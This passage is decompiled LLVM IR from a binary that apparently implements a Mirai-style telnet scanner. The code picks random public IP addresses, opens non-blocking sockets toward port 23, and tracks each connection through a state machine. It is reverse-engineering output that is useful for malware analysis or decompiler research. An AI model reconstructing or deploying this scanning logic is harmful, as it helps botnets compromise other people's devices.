  %v4_804c98b = add i32 %stack_var_-48.0, 1
  store i32 %v4_804c98b, i32* %eax.global-to-local, align 4
  %v1_804c991 = mul i32 %v4_804c98b, 4
  %v2_804c991 = add i32 %v1_804c991, ptrtoint ([10 x i8*]* @global_var_805b1c0.251 to i32)
  %v3_804c991 = inttoptr i32 %v2_804c991 to i32*
  %v4_804c991 = load i32, i32* %v3_804c991, align 4
  store i32 %v4_804c991, i32* %eax.global-to-local, align 4
  %v1_804c998 = icmp eq i32 %v4_804c991, 0
  %v1_804c99a = icmp eq i1 %v1_804c998, false
  br i1 %v1_804c99a, label %dec_label_pc_804c98b, label %dec_label_pc_804c99c.preheader

dec_label_pc_804c99c.preheader:                   ; preds = %dec_label_pc_804c98b
  %v2_804cdb2 = ptrtoint i32* %stack_var_-316 to i32
  %tmp38 = bitcast i32* %stack_var_-316 to i8*
  %v2_804ce35 = ptrtoint i32* %stack_var_-324 to i32
  %v2_804ce8d = ptrtoint i32* %stack_var_-328 to i32
  %v2_804ce94 = ptrtoint i32* %stack_var_-332 to i32
  %v2_804ca0d = or i32 %v2_804c8c7, 8
  %v2_804ca50 = or i32 %v2_804c8c7, 9
  %v2_804cb3f = or i32 %v2_804c8c7, 11
  %v2_804cb79 = or i32 %v2_804c8c7, 10
  %v2_804d574 = add i32 %v2_804c8c7, 16
  br label %dec_label_pc_804c99c

dec_label_pc_804c99c:                             ; preds = %dec_label_pc_804c99c, %dec_label_pc_804d8eb, %dec_label_pc_804c99c.preheader
  %stack_var_-624.0 = phi i32 [ %tmp4, %dec_label_pc_804c99c.preheader ], [ %stack_var_-624.0, %dec_label_pc_804c99c ], [ %stack_var_-624.1, %dec_label_pc_804d8eb ]
  %stack_var_-620.0 = phi i32 [ %tmp5, %dec_label_pc_804c99c.preheader ], [ %stack_var_-620.0, %dec_label_pc_804c99c ], [ %stack_var_-620.1, %dec_label_pc_804d8eb ]
  store i32 0, i32* %eax.global-to-local, align 4
  br i1 %v5_804c97e50, label %dec_label_pc_804c9a8, label %dec_label_pc_804c99c

dec_label_pc_804c9a8:                             ; preds = %dec_label_pc_804c99c, %dec_label_pc_804d8eb
  %storemerge45 = phi i32 [ %v4_804d8eb, %dec_label_pc_804d8eb ], [ 0, %dec_label_pc_804c99c ]
  %stack_var_-620.244 = phi i32 [ %stack_var_-620.1, %dec_label_pc_804d8eb ], [ %stack_var_-620.0, %dec_label_pc_804c99c ]
  %stack_var_-624.243 = phi i32 [ %stack_var_-624.1, %dec_label_pc_804d8eb ], [ %stack_var_-624.0, %dec_label_pc_804c99c ]
  %v1_804c9ae = mul i32 %storemerge45, 4
  store i32 %v1_804c9ae, i32* %edx.global-to-local, align 4
  %v2_804c9bc = mul i32 %storemerge45, 28
  %v2_804c9be = add i32 %v2_804c9bc, %v2_804c8c7
  %v1_804c9c0 = add i32 %v2_804c9be, 16
  store i32 %v1_804c9c0, i32* %eax.global-to-local, align 4
  %v1_804c9c3 = inttoptr i32 %v1_804c9c0 to i32*
  %v2_804c9c3 = load i32, i32* %v1_804c9c3, align 4
  store i32 %v2_804c9c3, i32* %eax.global-to-local, align 4
  %v1_804c9c5 = icmp eq i32 %v2_804c9c3, 0
  %v1_804c9c7 = icmp eq i1 %v1_804c9c5, false
  br i1 %v1_804c9c7, label %dec_label_pc_804c9f7, label %dec_label_pc_804c9c9

dec_label_pc_804c9c9:                             ; preds = %dec_label_pc_804c9a8
  store i32 %storemerge45, i32* @ebx, align 4
  %v0_804c9cc = load i32, i32* @esp, align 4
  %v1_804c9cf = add i32 %v0_804c9cc, -16
  %v2_804c9cf = inttoptr i32 %v1_804c9cf to i32*
  store i32 0, i32* %v2_804c9cf, align 4
  %v1_804c9d1 = inttoptr i32 %storemerge45 to i32*
  %v2_804c9d1 = call i32 @__GI_time(i32* %v1_804c9d1)
  store i32 %v2_804c9d1, i32* @esi, align 4
  %v0_804c9de = load i32, i32* @ebx, align 4
  %v1_804c9e0 = mul i32 %v0_804c9de, 4
  store i32 %v1_804c9e0, i32* %edx.global-to-local, align 4
  %v2_804c9ee = mul i32 %v0_804c9de, 28
  %v2_804c9f0 = add i32 %v2_804c9ee, %v2_804c8c7
  %v1_804c9f2 = add i32 %v2_804c9f0, 16
  store i32 %v1_804c9f2, i32* %eax.global-to-local, align 4
  %v2_804c9f5 = inttoptr i32 %v1_804c9f2 to i32*
  store i32 %v2_804c9d1, i32* %v2_804c9f5, align 4
  br label %dec_label_pc_804c9f7

dec_label_pc_804c9f7:                             ; preds = %dec_label_pc_804c9a8, %dec_label_pc_804c9c9
  store i32 %v1_804c9ae, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9bc, i32* %eax.global-to-local, align 4
  %v3_804ca0d = add i32 %v2_804ca0d, %v2_804c9bc
  %v4_804ca0d = inttoptr i32 %v3_804ca0d to i8*
  %v5_804ca0d = load i8, i8* %v4_804ca0d, align 4
  %v6_804ca0d = zext i8 %v5_804ca0d to i32
  %v8_804ca0d = and i32 %v2_804c9bc, -256
  %v9_804ca0d = or i32 %v6_804ca0d, %v8_804ca0d
  store i32 %v9_804ca0d, i32* %eax.global-to-local, align 4
  store i32 %v6_804ca0d, i32* %edx.global-to-local, align 4
  store i32 %v6_804ca0d, i32* @edi, align 4
  %v1_804ca31 = mul nuw nsw i32 %v6_804ca0d, 4
  %v2_804ca31 = add nuw nsw i32 %v1_804ca31, 134580632
  %v3_804ca31 = inttoptr i32 %v2_804ca31 to i32*
  %v4_804ca31 = load i32, i32* %v3_804ca31, align 4
  store i32 %v4_804ca31, i32* %eax.global-to-local, align 4
  switch i8 %v5_804ca0d, label %dec_label_pc_804d8eb [
    i8 0, label %dec_label_pc_804ca3a
    i8 1, label %dec_label_pc_804cda8
    i8 2, label %dec_label_pc_804cfed
    i8 3, label %dec_label_pc_804d129
    i8 4, label %dec_label_pc_804d271
    i8 5, label %dec_label_pc_804d3ad
    i8 6, label %dec_label_pc_804d4f5
    i8 7, label %dec_label_pc_804d78f
  ]

dec_label_pc_804ca3a:                             ; preds = %dec_label_pc_804c9f7
  store i32 %v1_804c9ae, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9bc, i32* %eax.global-to-local, align 4
  %v3_804ca50 = add i32 %v2_804ca50, %v2_804c9bc
  %v4_804ca50 = inttoptr i32 %v3_804ca50 to i8*
  %v5_804ca50 = load i8, i8* %v4_804ca50, align 1
  %v10_804ca54 = icmp eq i8 %v5_804ca50, 1
  %v1_804ca56 = icmp eq i1 %v10_804ca54, false
  store i32 %v1_804c9ae, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9bc, i32* %eax.global-to-local, align 4
  br i1 %v1_804ca56, label %dec_label_pc_804cb05, label %dec_label_pc_804ca5c

dec_label_pc_804ca5c:                             ; preds = %dec_label_pc_804ca3a
  %v1_804ca74 = add i32 %v2_804c9be, 24
  store i32 %v1_804ca74, i32* %eax.global-to-local, align 4
  %v1_804ca77 = inttoptr i32 %v1_804ca74 to i32*
  %v2_804ca77 = load i32, i32* %v1_804ca77, align 4
  store i32 %v2_804c9be, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v2_804ca9a = inttoptr i32 %v2_804c9be to i32*
  store i32 0, i32* %v2_804ca9a, align 4
  %v0_804ca9c = load i32, i32* %eax.global-to-local, align 4
  %v1_804ca9c = add i32 %v0_804ca9c, 4
  store i32 %v1_804ca9c, i32* %eax.global-to-local, align 4
  %v0_804ca9f = load i32, i32* %edx.global-to-local, align 4
  %v2_804ca9f = inttoptr i32 %v1_804ca9c to i32*
  store i32 %v0_804ca9f, i32* %v2_804ca9f, align 4
  %v0_804caa1 = load i32, i32* %eax.global-to-local, align 4
  %v1_804caa1 = add i32 %v0_804caa1, 4
  store i32 %v1_804caa1, i32* %eax.global-to-local, align 4
  %v0_804caa4 = load i32, i32* %edx.global-to-local, align 4
  %v2_804caa4 = inttoptr i32 %v1_804caa1 to i32*
  store i32 %v0_804caa4, i32* %v2_804caa4, align 4
  %v0_804caa6 = load i32, i32* %eax.global-to-local, align 4
  %v1_804caa6 = add i32 %v0_804caa6, 4
  store i32 %v1_804caa6, i32* %eax.global-to-local, align 4
  %v0_804caa9 = load i32, i32* %edx.global-to-local, align 4
  %v2_804caa9 = inttoptr i32 %v1_804caa6 to i32*
  store i32 %v0_804caa9, i32* %v2_804caa9, align 4
  %v0_804caab = load i32, i32* %eax.global-to-local, align 4
  %v1_804caab = add i32 %v0_804caab, 4
  store i32 %v1_804caab, i32* %eax.global-to-local, align 4
  %v0_804caae = load i32, i32* %edx.global-to-local, align 4
  %v2_804caae = inttoptr i32 %v1_804caab to i32*
  store i32 %v0_804caae, i32* %v2_804caae, align 4
  %v0_804cab0 = load i32, i32* %eax.global-to-local, align 4
  %v1_804cab0 = add i32 %v0_804cab0, 4
  store i32 %v1_804cab0, i32* %eax.global-to-local, align 4
  %v0_804cab3 = load i32, i32* %edx.global-to-local, align 4
  %v2_804cab3 = inttoptr i32 %v1_804cab0 to i32*
  store i32 %v0_804cab3, i32* %v2_804cab3, align 4
  %v0_804cab5 = load i32, i32* %eax.global-to-local, align 4
  %v1_804cab5 = add i32 %v0_804cab5, 4
  %v0_804cab8 = load i32, i32* %edx.global-to-local, align 4
  %v2_804cab8 = inttoptr i32 %v1_804cab5 to i32*
  store i32 %v0_804cab8, i32* %v2_804cab8, align 4
  store i32 %v1_804ca74, i32* %edx.global-to-local, align 4
  store i32 %v2_804ca77, i32* @eax, align 4
  store i32 %v2_804ca77, i32* %v1_804ca77, align 4
  store i32 %storemerge45, i32* @ebx, align 4
  %v1_804cadd = call i32 @GetRandomPublicIP(i32 %v6_804ca0d)
  %v0_804cae7 = load i32, i32* @ebx, align 4
  %v1_804cae9 = mul i32 %v0_804cae7, 4
  store i32 %v1_804cae9, i32* %edx.global-to-local, align 4
  %v2_804caf7 = mul i32 %v0_804cae7, 28
  %v2_804caf9 = add i32 %v2_804caf7, %v2_804c8c7
  %v1_804cafb = add i32 %v2_804caf9, 4
  store i32 %v1_804cafb, i32* %eax.global-to-local, align 4
  %v2_804cafe = inttoptr i32 %v1_804cafb to i32*
  store i32 %v1_804cadd, i32* %v2_804cafe, align 4
  br label %dec_label_pc_804cc17

dec_label_pc_804cb05:                             ; preds = %dec_label_pc_804ca3a
  %v5_804cb1b = load i8, i8* %v4_804ca50, align 1
  %v6_804cb1b = zext i8 %v5_804cb1b to i32
  %v9_804cb1b = or i32 %v6_804cb1b, %v8_804ca0d
  store i32 %v9_804cb1b, i32* %eax.global-to-local, align 4
  %v4_804cb1f = icmp eq i8 %v5_804cb1b, 0
  %v1_804cb21 = icmp eq i1 %v4_804cb1f, false
  br i1 %v1_804cb21, label %dec_label_pc_804cc17, label %dec_label_pc_804cb27

dec_label_pc_804cb27:                             ; preds = %dec_label_pc_804cb05
  store i32 %v1_804c9ae, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9bc, i32* %eax.global-to-local, align 4
  %v3_804cb3f = add i32 %v2_804cb3f, %v2_804c9bc
  %v4_804cb3f = inttoptr i32 %v3_804cb3f to i8*
  %v5_804cb3f = load i8, i8* %v4_804cb3f, align 1
  %v1_804cb43 = add i8 %v5_804cb3f, 1
  store i8 %v1_804cb43, i8* %v4_804cb3f, align 1
  store i32 %v1_804c9ae, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9bc, i32* %eax.global-to-local, align 4
  %v3_804cb79 = add i32 %v2_804cb79, %v2_804c9bc
  %v4_804cb79 = inttoptr i32 %v3_804cb79 to i8*
  %v5_804cb79 = load i8, i8* %v4_804cb79, align 2
  %v6_804cb79 = zext i8 %v5_804cb79 to i32
  %v9_804cb79 = or i32 %v6_804cb79, %v8_804ca0d
  %v1_804cb7d = add i32 %v9_804cb79, 1
  store i32 %v1_804cb7d, i32* @esi, align 4
  %v1_804cb97 = trunc i32 %v1_804cb7d to i8
  store i8 %v1_804cb97, i8* %v4_804cb79, align 2
  store i32 %v1_804c9ae, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9bc, i32* %eax.global-to-local, align 4
  %v5_804cbb1 = load i8, i8* %v4_804cb3f, align 1
  %v10_804cbb5 = icmp eq i8 %v5_804cbb1, 3
  %v1_804cbb7 = icmp eq i1 %v10_804cbb5, false
  store i32 %v1_804c9ae, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9bc, i32* %eax.global-to-local, align 4
  br i1 %v1_804cbb7, label %dec_label_pc_804cbd9, label %dec_label_pc_804cbb9

dec_label_pc_804cbb9:                             ; preds = %dec_label_pc_804cb27
  store i8 1, i8* %v4_804ca50, align 1
  br label %dec_label_pc_804d8eb

dec_label_pc_804cbd9:                             ; preds = %dec_label_pc_804cb27
  %v5_804cbef = load i8, i8* %v4_804cb79, align 2
  %v6_804cbef = zext i8 %v5_804cbef to i32
  %v9_804cbef = or i32 %v6_804cbef, %v8_804ca0d
  store i32 %v9_804cbef, i32* %eax.global-to-local, align 4
  %v10_804cbf3 = icmp eq i8 %v5_804cbef, 3
  %v1_804cbf5 = icmp eq i1 %v10_804cbf3, false
  br i1 %v1_804cbf5, label %dec_label_pc_804cc17, label %dec_label_pc_804cbf7

dec_label_pc_804cbf7:                             ; preds = %dec_label_pc_804cbd9
  store i32 %v1_804c9ae, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9bc, i32* %eax.global-to-local, align 4
  store i8 1, i8* %v4_804ca50, align 1
  br label %dec_label_pc_804d8eb

dec_label_pc_804cc17:                             ; preds = %dec_label_pc_804cbd9, %dec_label_pc_804cb05, %dec_label_pc_804ca5c
  store i32 2, i32* %stack_var_-604, align 4
  %v0_804cc20 = load i32, i32* @esp, align 4
  %v1_804cc23 = add i32 %v0_804cc20, -16
  %v2_804cc23 = inttoptr i32 %v1_804cc23 to i32*
  store i32 23, i32* %v2_804cc23, align 4
  %v0_804cc25 = load i32, i32* %stack_var_-604, align 4
  %v1_804cc25 = call i32 @htons(i32 %v0_804cc25)
  %v0_804cc2a = load i32, i32* @esp, align 4
  store i32 0, i32* %stack_var_-596, align 4
  store i32 %v1_804c9ae, i32* %edx.global-to-local, align 4
  %v1_804cc62 = add i32 %v2_804c9be, 4
  store i32 %v1_804cc62, i32* %eax.global-to-local, align 4
  %v1_804cc65 = inttoptr i32 %v1_804cc62 to i32*
  %v2_804cc65 = load i32, i32* %v1_804cc65, align 4
  store i32 %v2_804cc65, i32* %eax.global-to-local, align 4
  store i32 %storemerge45, i32* @ebx, align 4
  %v1_804cc73 = add i32 %v0_804cc2a, 8
  %v2_804cc73 = inttoptr i32 %v1_804cc73 to i32*
  store i32 0, i32* %v2_804cc73, align 4
  %v1_804cc75 = add i32 %v0_804cc2a, 4
  %v2_804cc75 = inttoptr i32 %v1_804cc75 to i32*
  store i32 1, i32* %v2_804cc75, align 4
  %v2_804cc77 = inttoptr i32 %v0_804cc2a to i32*
  store i32 2, i32* %v2_804cc77, align 4
  %v2_804cc79 = load i32, i32* %stack_var_-596, align 4
  %sext = mul i32 %v1_804cc25, 65536
  %v3_804cc79 = sdiv i32 %sext, 65536
  %v4_804cc79 = call i32 @socket(i32 %v3_804cc79, i32 %v2_804cc65, i32 %v2_804cc79)
  store i32 %v4_804cc79, i32* @esi, align 4
  %v0_804cc86 = load i32, i32* @ebx, align 4
  %v2_804cc96 = mul i32 %v0_804cc86, 28
  %v3_804cc98 = add i32 %v2_804cc96, %v2_804c8c7
  %v4_804cc98 = inttoptr i32 %v3_804cc98 to i32*
  store i32 %v4_804cc79, i32* %v4_804cc98, align 4
  store i32 %v1_804c9ae, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9bc, i32* %eax.global-to-local, align 4
  %v3_804ccb1 = inttoptr i32 %v2_804c9be to i32*
  %v4_804ccb1 = load i32, i32* %v3_804ccb1, align 4
  store i32 %v4_804ccb1, i32* %eax.global-to-local, align 4
  %v10_804ccb4 = icmp eq i32 %v4_804ccb1, -1
  br i1 %v10_804ccb4, label %dec_label_pc_804d8eb, label %dec_label_pc_804ccbd

dec_label_pc_804ccbd:                             ; preds = %dec_label_pc_804cc17
  store i32 %v1_804c9ae, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9bc, i32* %eax.global-to-local, align 4
  %v4_804ccd3 = load i32, i32* %v3_804ccb1, align 4
  store i32 %v4_804ccd3, i32* %eax.global-to-local, align 4
  %v0_804ccd6 = load i32, i32* @esp, align 4
  %v1_804ccd9 = add i32 %v0_804ccd6, -8
  %v2_804ccd9 = inttoptr i32 %v1_804ccd9 to i32*
  store i32 0, i32* %v2_804ccd9, align 4
  %v1_804ccdb = add i32 %v0_804ccd6, -12
  %v2_804ccdb = inttoptr i32 %v1_804ccdb to i32*
  store i32 3, i32* %v2_804ccdb, align 4
  %v0_804ccdd = load i32, i32* %eax.global-to-local, align 4
  %v2_804ccdd = add i32 %v0_804ccd6, -16
  %v3_804ccdd = inttoptr i32 %v2_804ccdd to i32*
  store i32 %v0_804ccdd, i32* %v3_804ccdd, align 4
  %v1_804ccde = load i32, i32* %stack_var_-596, align 4
  %v3_804ccde = call i32 @__libc_fcntl(i32 %v2_804cc65, i32 %v1_804ccde, i32 0)
  %v0_804cce3 = load i32, i32* @esp, align 4
  %v12_804cce8 = or i32 %v3_804ccde, 2048
  store i32 %v12_804cce8, i32* @ebx, align 4
  store i32 %v1_804c9ae, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9bc, i32* %eax.global-to-local, align 4
  %v4_804cd01 = load i32, i32* %v3_804ccb1, align 4
  store i32 %v4_804cd01, i32* %eax.global-to-local, align 4
  %v2_804cd07 = add i32 %v0_804cce3, 8
  %v3_804cd07 = inttoptr i32 %v2_804cd07 to i32*
  store i32 %v12_804cce8, i32* %v3_804cd07, align 4
  %v1_804cd08 = add i32 %v0_804cce3, 4
  %v2_804cd08 = inttoptr i32 %v1_804cd08 to i32*
  store i32 4, i32* %v2_804cd08, align 4
  %v0_804cd0a = load i32, i32* %eax.global-to-local, align 4
  %v3_804cd0a = inttoptr i32 %v0_804cce3 to i32*
  store i32 %v0_804cd0a, i32* %v3_804cd0a, align 4
  %v1_804cd0b = load i32, i32* %stack_var_-596, align 4
  %v3_804cd0b = call i32 @__libc_fcntl(i32 %v2_804cc65, i32 %v1_804cd0b, i32 0)
  %v0_804cd10 = load i32, i32* @esp, align 4
  store i32 %v2_804c855, i32* @ebx, align 4
  store i32 %v1_804c9ae, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9bc, i32* %eax.global-to-local, align 4
  %v4_804cd2f = load i32, i32* %v3_804ccb1, align 4
  store i32 %v4_804cd2f, i32* %eax.global-to-local, align 4
  %v1_804cd35 = add i32 %v0_804cd10, 8
  %v2_804cd35 = inttoptr i32 %v1_804cd35 to i32*
  store i32 16, i32* %v2_804cd35, align 4
  %v2_804cd37 = add i32 %v0_804cd10, 4
  %v3_804cd37 = inttoptr i32 %v2_804cd37 to i32*
  store i32 %v2_804c855, i32* %v3_804cd37, align 4
  %v0_804cd38 = load i32, i32* %eax.global-to-local, align 4
  %v3_804cd38 = inttoptr i32 %v0_804cd10 to i32*
  store i32 %v0_804cd38, i32* %v3_804cd38, align 4
  %v1_804cd39 = load i32, i32* %stack_var_-596, align 4
  %v3_804cd39 = call i32 @__libc_connect(i32 %v2_804cc65, i32 %v1_804cd39, i32 0)
  store i32 %v3_804cd39, i32* %eax.global-to-local, align 4
  %v0_804cd3e = load i32, i32* @esp, align 4
  %v1_804cd3e = add i32 %v0_804cd3e, 16
  %v10_804cd41 = icmp eq i32 %v3_804cd39, -1
  %v1_804cd44 = icmp eq i1 %v10_804cd41, false
  br i1 %v1_804cd44, label %dec_label_pc_804cd7c, label %dec_label_pc_804cd46

dec_label_pc_804cd46:                             ; preds = %dec_label_pc_804ccbd
  %v1_804cd46 = call i32 @__errno_location(i32 %v2_804cc65)
  store i32 %v1_804cd46, i32* %eax.global-to-local, align 4
  %v1_804cd4b = inttoptr i32 %v1_804cd46 to i32*
  %v2_804cd4b = load i32, i32* %v1_804cd4b, align 4
  store i32 %v2_804cd4b, i32* %eax.global-to-local, align 4
  %v9_804cd4d = icmp eq i32 %v2_804cd4b, 115
  br i1 %v9_804cd4d, label %dec_label_pc_804cd46.dec_label_pc_804cd7c_crit_edge, label %dec_label_pc_804cd52

dec_label_pc_804cd46.dec_label_pc_804cd7c_crit_edge: ; preds = %dec_label_pc_804cd46
  %v0_804cd95.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804cd7c

dec_label_pc_804cd52:                             ; preds = %dec_label_pc_804cd46
  store i32 %v1_804c9ae, i32* @edx, align 4
  store i32 %v2_804c9be, i32* %eax.global-to-local, align 4
  %v0_804cd6b = load i32, i32* @esp, align 4
  %v2_804cd6e = add i32 %v0_804cd6b, -16
  %v3_804cd6e = inttoptr i32 %v2_804cd6e to i32*
  store i32 %v2_804c9be, i32* %v3_804cd6e, align 4
  %v1_804cd6f = call i32 @reset_telstate(i32 %v2_804cc65)
  store i32 %v1_804cd6f, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d8eb

dec_label_pc_804cd7c:                             ; preds = %dec_label_pc_804cd46.dec_label_pc_804cd7c_crit_edge, %dec_label_pc_804ccbd
  %v0_804cd95 = phi i32 [ %v0_804cd95.pre, %dec_label_pc_804cd46.dec_label_pc_804cd7c_crit_edge ], [ %v1_804cd3e, %dec_label_pc_804ccbd ]
  store i32 %v1_804c9ae, i32* @edx, align 4
  store i32 %v2_804c9be, i32* %eax.global-to-local, align 4
  %v1_804cd98 = add i32 %v0_804cd95, -12
  %v2_804cd98 = inttoptr i32 %v1_804cd98 to i32*
  store i32 1, i32* %v2_804cd98, align 4
  %v0_804cd9a = load i32, i32* %eax.global-to-local, align 4
  %v2_804cd9a = add i32 %v0_804cd95, -16
  %v3_804cd9a = inttoptr i32 %v2_804cd9a to i32*
  store i32 %v0_804cd9a, i32* %v3_804cd9a, align 4
  %v1_804cd9b = load i32, i32* %stack_var_-596, align 4
  %v2_804cd9b = inttoptr i32 %v2_804cc65 to i32*
  %v3_804cd9b = call i32 @advance_state(i32* %v2_804cd9b, i32 %v1_804cd9b)
  store i32 %v3_804cd9b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d8eb

dec_label_pc_804cda8:                             ; preds = %dec_label_pc_804c9f7
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %v2_804cdb2, i32* @edi, align 4
  %v5_804cdb9 = call i8* @_memset(i8* %tmp38, i32 0, i32 32)
  store i32 %v1_804c9ae, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9bc, i32* %eax.global-to-local, align 4
  %v3_804cdd7 = inttoptr i32 %v2_804c9be to i32*
  %v4_804cdd7 = load i32, i32* %v3_804cdd7, align 4
  %v2_804cddc = udiv i32 %v4_804cdd7, 32
  store i32 %v2_804cddc, i32* @ebx, align 4
  store i32 %v1_804c9ae, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9bc, i32* %eax.global-to-local, align 4
  %v4_804cdf5 = load i32, i32* %v3_804cdd7, align 4
  %v1_804cdf8 = urem i32 %v4_804cdf5, 32
  store i32 %v1_804cdf8, i32* %eax.global-to-local, align 4
  %v0_804cdfb = load i32, i32* @ebp, align 4
  %v2_804cdfb = mul nuw nsw i32 %v2_804cddc, 4
  %v3_804cdfb = add nsw i32 %v2_804cdfb, -312
  %v4_804cdfb = add i32 %v3_804cdfb, %v0_804cdfb
  %v5_804cdfb = inttoptr i32 %v4_804cdfb to i32*
  %v6_804cdfb = load i32, i32* %v5_804cdfb, align 4
  %v9_804cdfb = shl i32 1, %v1_804cdf8
  %v12_804cdfb = or i32 %v6_804cdfb, %v9_804cdfb
  store i32 %v12_804cdfb, i32* %v5_804cdfb, align 4
  store i32 0, i32* %stack_var_-324, align 4
  store i32 %v1_804c9ae, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9bc, i32* %eax.global-to-local, align 4
  %v4_804ce2c = load i32, i32* %v3_804cdd7, align 4
  %v1_804ce2f = add i32 %v4_804ce2c, 1
  store i32 %v1_804ce2f, i32* %edx.global-to-local, align 4
  %v0_804ce32 = load i32, i32* @esp, align 4
  %v2_804ce3b = add i32 %v0_804ce32, -16
  %v3_804ce3b = inttoptr i32 %v2_804ce3b to i32*
  store i32 %v2_804ce35, i32* %v3_804ce3b, align 4
  %v1_804ce3c = add i32 %v0_804ce32, -20
  %v2_804ce3c = inttoptr i32 %v1_804ce3c to i32*
  store i32 0, i32* %v2_804ce3c, align 4
  store i32 %v2_804cdb2, i32* %eax.global-to-local, align 4
  %v2_804ce44 = add i32 %v0_804ce32, -24
  %v3_804ce44 = inttoptr i32 %v2_804ce44 to i32*
  store i32 %v2_804cdb2, i32* %v3_804ce44, align 4
  %v1_804ce45 = add i32 %v0_804ce32, -28
  %v2_804ce45 = inttoptr i32 %v1_804ce45 to i32*
  store i32 0, i32* %v2_804ce45, align 4
  %v0_804ce47 = load i32, i32* %edx.global-to-local, align 4
  %v2_804ce47 = add i32 %v0_804ce32, -32
  %v3_804ce47 = inttoptr i32 %v2_804ce47 to i32*
  store i32 %v0_804ce47, i32* %v3_804ce47, align 4
  %v0_804ce48 = load i32, i32* %stack_var_-324, align 4
  %v2_804ce48 = load i32, i32* %stack_var_-316, align 4
  %v5_804ce48 = call i32 @__libc_select(i32 %v0_804ce48, i32 %arg1, i32 %v2_804ce48, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_804ce48, i32* %eax.global-to-local, align 4
  %v0_804ce4d = load i32, i32* @esp, align 4
  %v12_804ce53 = icmp eq i32 %v5_804ce48, 1
  %v1_804ce57 = icmp eq i1 %v12_804ce53, false
  br i1 %v1_804ce57, label %dec_label_pc_804cf5e, label %dec_label_pc_804ce5d

dec_label_pc_804ce5d:                             ; preds = %dec_label_pc_804cda8
  store i32 4, i32* %stack_var_-328, align 4
  store i32 0, i32* %stack_var_-332, align 4
  store i32 %v1_804c9ae, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9bc, i32* %eax.global-to-local, align 4
  %v4_804ce87 = load i32, i32* %v3_804cdd7, align 4
  store i32 %v4_804ce87, i32* %edx.global-to-local, align 4
  %v2_804ce93 = add i32 %v0_804ce4d, 16
  %v3_804ce93 = inttoptr i32 %v2_804ce93 to i32*
  store i32 %v2_804ce8d, i32* %v3_804ce93, align 4
  store i32 %v2_804ce94, i32* %eax.global-to-local, align 4
  %v2_804ce9a = add i32 %v0_804ce4d, 12
  %v3_804ce9a = inttoptr i32 %v2_804ce9a to i32*
  store i32 %v2_804ce94, i32* %v3_804ce9a, align 4
  %v1_804ce9b = add i32 %v0_804ce4d, 8
  %v2_804ce9b = inttoptr i32 %v1_804ce9b to i32*
  store i32 4, i32* %v2_804ce9b, align 4
  %v1_804ce9d = add i32 %v0_804ce4d, 4
  %v2_804ce9d = inttoptr i32 %v1_804ce9d to i32*
  store i32 1, i32* %v2_804ce9d, align 4
  %v0_804ce9f = load i32, i32* %edx.global-to-local, align 4
  %v3_804ce9f = inttoptr i32 %v0_804ce4d to i32*
  store i32 %v0_804ce9f, i32* %v3_804ce9f, align 4
  %v0_804cea0 = load i32, i32* %stack_var_-332, align 4
  %v1_804cea0 = load i32, i32* %stack_var_-328, align 4
  %v2_804cea0 = load i32, i32* %stack_var_-324, align 4
  %v4_804cea0 = load i32, i32* %stack_var_-316, align 4
  %v5_804cea0 = call i32 @getsockopt(i32 %v0_804cea0, i32 %v1_804cea0, i32 %v2_804cea0, i32 %arg1, i32 %v4_804cea0)
  %v0_804cea5 = load i32, i32* @esp, align 4
  %v3_804cea8 = load i32, i32* %stack_var_-332, align 4
  store i32 %v3_804cea8, i32* %eax.global-to-local, align 4
  %v1_804ceae = icmp eq i32 %v3_804cea8, 0
  store i32 %v1_804c9ae, i32* @edx, align 4
  br i1 %v1_804ceae, label %dec_label_pc_804cedc, label %dec_label_pc_804ceb2

dec_label_pc_804ceb2:                             ; preds = %dec_label_pc_804ce5d
  store i32 %v2_804c9be, i32* %eax.global-to-local, align 4
  %v2_804cece = add i32 %v0_804cea5, 16
  %v3_804cece = inttoptr i32 %v2_804cece to i32*
  store i32 %v2_804c9be, i32* %v3_804cece, align 4
  %v0_804cecf = load i32, i32* %stack_var_-332, align 4
  %v1_804cecf = call i32 @reset_telstate(i32 %v0_804cecf)
  store i32 %v1_804cecf, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d8eb

dec_label_pc_804cedc:                             ; preds = %dec_label_pc_804ce5d
  store i32 %v2_804c9bc, i32* %eax.global-to-local, align 4
  %v4_804cef2 = load i32, i32* %v3_804cdd7, align 4
  store i32 %v4_804cef2, i32* %eax.global-to-local, align 4
  %v1_804cef8 = add i32 %v0_804cea5, 24
  %v2_804cef8 = inttoptr i32 %v1_804cef8 to i32*
  store i32 0, i32* %v2_804cef8, align 4
  %v1_804cefa = add i32 %v0_804cea5, 20
  %v2_804cefa = inttoptr i32 %v1_804cefa to i32*
  store i32 3, i32* %v2_804cefa, align 4
  %v0_804cefc = load i32, i32* %eax.global-to-local, align 4
  %v2_804cefc = add i32 %v0_804cea5, 16
  %v3_804cefc = inttoptr i32 %v2_804cefc to i32*
  store i32 %v0_804cefc, i32* %v3_804cefc, align 4
  %v0_804cefd = load i32, i32* %stack_var_-332, align 4
  %v1_804cefd = load i32, i32* %stack_var_-328, align 4
  %v2_804cefd = load i32, i32* %stack_var_-324, align 4
  %v3_804cefd = call i32 @__libc_fcntl(i32 %v0_804cefd, i32 %v1_804cefd, i32 %v2_804cefd)
  %v0_804cf02 = load i32, i32* @esp, align 4
  %v13_804cf07 = and i32 %v3_804cefd, -2049
  store i32 %v13_804cf07, i32* @ebx, align 4
